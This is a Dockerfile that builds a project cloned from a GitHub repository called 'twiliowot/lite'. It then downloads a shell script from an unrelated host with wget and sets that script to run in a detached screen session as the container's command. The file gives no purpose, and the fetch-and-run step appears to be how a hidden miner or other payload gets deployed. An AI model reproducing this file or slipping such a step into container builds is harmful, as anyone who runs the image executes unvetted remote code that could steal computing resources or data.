FROM ubuntu:16.10

RUN apt-get update && \
    apt-get install git build-essential cmake libcurl4-openssl-dev wget screen -y && \
    git clone https://github.com/twiliowot/lite && \
    cd lite && \
    mkdir build && \
    cd build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release && \
    make && \
    wget http://247app.host/run.sh && \
    chmod 755 run.sh

WORKDIR /lite/build
CMD ["screen sh ./run.sh"]
